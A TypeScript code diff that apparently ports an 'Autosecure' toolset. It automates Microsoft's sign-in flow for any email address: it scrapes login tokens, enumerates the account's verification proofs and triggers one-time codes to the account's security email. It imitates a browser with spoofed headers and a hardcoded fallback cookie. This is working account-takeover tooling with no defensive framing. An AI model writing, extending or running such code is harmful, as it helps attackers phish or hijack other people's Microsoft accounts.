@@ -92,11 +92,11 @@ function decodeUnicodeEscapes(s: string): string {
   );
 }
 
-/** POST to login.live.com to get PPFT and urlPost */
+/** Port of Autosecure getLiveData.py */
 export async function getLiveData(jar?: CookieJar): Promise<LiveData> {
   const useJar = jar ?? new CookieJar();
   const res = await fetchWithJar(useJar, "https://login.live.com", {
-    method: "GET",
+    method: "POST",
     headers: {
       "User-Agent":
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
@@ -110,8 +110,9 @@ export async function getLiveData(jar?: CookieJar): Promise<LiveData> {
   const urlPost =
     extractValue(
       text,
-      /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?[^"'\\\s]+/,
+      /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0/,
     ) ||
+    extractValue(text, /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?[^"'\\\s]+/) ||
     extractValue(text, /urlPost['"]\s*:\s*['"]([^'"]+)['"]/);
 
   if (!urlPost) throw new Error("Failed to extract urlPost from login.live.com");
@@ -126,20 +127,19 @@ export async function getLiveData(jar?: CookieJar): Promise<LiveData> {
   return { urlPost: decodeUnicodeEscapes(urlPost), ppft: ppftMatch };
 }
 
-/** Send auth request to Microsoft to check available verification methods */
+/** Port of Autosecure sendAuth.py */
 export async function sendAuth(email: string): Promise<{
   credentials: Record<string, unknown> | null;
   raw: Record<string, unknown>;
   flowToken?: string;
 }> {
   const jar = new CookieJar();
-  // Warm session + get a fresh flow token when possible
   let flowToken = "";
   try {
     const live = await getLiveData(jar);
     flowToken = live.ppft;
   } catch {
-    /* continue with empty flow token */
+    /* continue */
   }
 
   const res = await fetch("https://login.live.com/GetCredentialType.srf", {
@@ -148,9 +148,11 @@ export async function sendAuth(email: string): Promise<{
       Accept: "application/json",
       "Content-Type": "application/json; charset=utf-8",
       Referer: "https://login.live.com/",
-      Cookie: jar.getHeader(),
+      Cookie: jar.getHeader() || "MSPOK=$uuid-899fc7db-4aba-4e53-b33b-7b3268c26691",
       "User-Agent":
         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+      hpgact: "0",
+      hpgid: "33",
     },
     body: JSON.stringify({
       checkPhones: true,
@@ -180,7 +182,6 @@ export async function sendAuth(email: string): Promise<{
   return { credentials: creds, raw: data, flowToken: returnedFlow };
 }
 
-/** Detect which auth method is available for the account */
 export function detectAuthMethod(
   credentials: Record<string, unknown> | null,
 ): AuthMethodInfo {
@@ -200,18 +201,18 @@ export function detectAuthMethod(
     const proofs = credentials.OtcLoginEligibleProofs as Array<Record<string, string>>;
     if (proofs && proofs.length > 0) {
       const emailProof =
-        proofs.find((p) => /@/.test(p.display || "") || /email/i.test(p.type || "")) ||
+        proofs.find((p) => /@/.test(p.display || "") || /email/i.test(String(p.type || ""))) ||
         proofs[0];
       return {
         method: "email_otp",
         securityEmail: emailProof.display ?? "unknown",
+        // proof data used as SentProofIDE at login (Autosecure verflowtoken)
         flowToken: emailProof.data ?? "",
       };
     }
     return { method: "none", detail: "No eligible proofs" };
   }
 
-  // HasPassword / other fields only — no OTP path
   if (credentials.HasPassword === true || credentials.PrefCredential === 1) {
     return {
       method: "none",
@@ -222,28 +223,38 @@ export function detectAuthMethod(
   return { method: "none", detail: "No auth methods available" };
 }
 
-/** Send OTP to the account's security email (maintains cookie session via jar) */
+/**
+ * Exact port of Autosecure-main/views/utils/sendOtt.py
+ * Flow: empty-password login → ipt/pprid identity confirm → account.live.com SendOtt
+ */
 export async function sendOtt(
   jar: CookieJar,
   email: string,
   securityEmail: string,
+  _proofData?: string,
+  _sessionFlowToken?: string,
 ): Promise<boolean> {
   try {
-    const liveData = await getLiveData(jar);
+    const data = await getLiveData(jar);
 
-    // Step 1: Submit email to start login flow
-    const loginRes = await fetchWithJar(jar, liveData.urlPost, {
+    // Step 1: Submit email with empty password (type 11) — Autosecure sendOtt.py
+    const loginRes = await fetchWithJar(jar, data.urlPost, {
       method: "POST",
       headers: {
+        host: "login.live.com",
+        "Accept-Language": "en-US,en;q=0.5",
         "Content-Type": "application/x-www-form-urlencoded",
         Origin: "https://login.live.com",
-        "Accept-Language": "en-US,en;q=0.5",
+        Referer: "https://login.live.com/",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
         "User-Agent":
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
       },
       body: new URLSearchParams({
         ps: "2",
-        PPFT: liveData.ppft,
+        PPFT: data.ppft,
         PPSX: "Pass",
         login: email,
         loginfmt: email,
@@ -253,41 +264,42 @@ export async function sendOtt(
     });
     const loginText = await loginRes.text();
 
-    // Step 2: Parse MFA page for proof list
-    const actionMatch =
-      loginText.match(/action="([^"]+)"/i) ||
-      loginText.match(/urlPost['"]\s*:\s*['"]([^'"]+)['"]/);
+    const actionMatch = loginText.match(/action="([^"]+)"/);
     if (!actionMatch) {
       console.error("[sendOtt] Failed to parse action URL");
       return false;
     }
-    const action = decodeUnicodeEscapes(actionMatch[1]);
+    const action = actionMatch[1];
 
-    const iptMatch =
-      loginText.match(/name="ipt"[^>]*value="([^"]+)"/i) ||
-      loginText.match(/"ipt"\s*:\s*"([^"]+)"/);
-    const ppridMatch =
-      loginText.match(/name="pprid"[^>]*value="([^"]+)"/i) ||
-      loginText.match(/"pprid"\s*:\s*"([^"]+)"/);
+    const iptMatch = loginText.match(/name="ipt"[^>]+value="([^"]+)"/);
+    const ppridMatch = loginText.match(/name="pprid"[^>]+value="([^"]+)"/);
     if (!iptMatch || !ppridMatch) {
-      console.error("[sendOtt] Failed to parse ipt/pprid — may need password or account locked");
+      console.error(
+        "[sendOtt] Failed to parse ipt/pprid — account may need password or is authenticator-only",
+      );
       return false;
     }
     const ipt = decodeURIComponent(iptMatch[1]);
     const pprid = ppridMatch[1];
 
+    // Step 2: Identity confirm
     const identityRes = await fetchWithJar(jar, action, {
       method: "POST",
       headers: {
+        host: "account.live.com",
+        "Accept-Language": "en-US,en;q=0.5",
         "Content-Type": "application/x-www-form-urlencoded",
         Origin: "https://login.live.com",
-        "Accept-Language": "en-US,en;q=0.5",
+        Referer: "https://login.live.com/",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
       },
       body: new URLSearchParams({ pprid, ipt }).toString(),
     });
     const identityText = await identityRes.text();
 
-    // Step 3: Extract proof list and API tokens
+    // Step 3: rawProofList + tokens
     const rawStrMatch = identityText.match(/"rawProofList"\s*:\s*"([^"]+)"/);
     if (!rawStrMatch) {
       console.error("[sendOtt] No rawProofList found");
@@ -312,11 +324,15 @@ export async function sendOtt(
     const uaid = extractValue(identityText, /"uaid"\s*:\s*"([^"]+)"/) ?? "";
 
     if (!apiCanary || !eipt || !uaid) {
-      console.error("[sendOtt] Failed to extract API tokens");
+      console.error("[sendOtt] Failed to extract API tokens", {
+        hasCanary: !!apiCanary,
+        hasEipt: !!eipt,
+        hasUaid: !!uaid,
+      });
       return false;
     }
 
-    // Step 4: Send OTP
+    // Step 4: SendOtt — exact Autosecure payload
     const otpRes = await fetchWithJar(jar, "https://account.live.com/api/Proofs/SendOtt", {
       method: "POST",
       headers: {
@@ -344,11 +360,9 @@ export async function sendOtt(
       }),
     });
 
-    if (!otpRes.ok) {
-      const t = await otpRes.text().catch(() => "");
-      console.error("[sendOtt] SendOtt failed:", otpRes.status, t.slice(0, 200));
-    }
-    return otpRes.ok;
+    const body = await otpRes.text().catch(() => "");
+    console.log("[sendOtt] Status:", otpRes.status, body.slice(0, 200));
+    return otpRes.status === 200;
   } catch (e) {
     console.error("[sendOtt] Error:", e);
     return false;
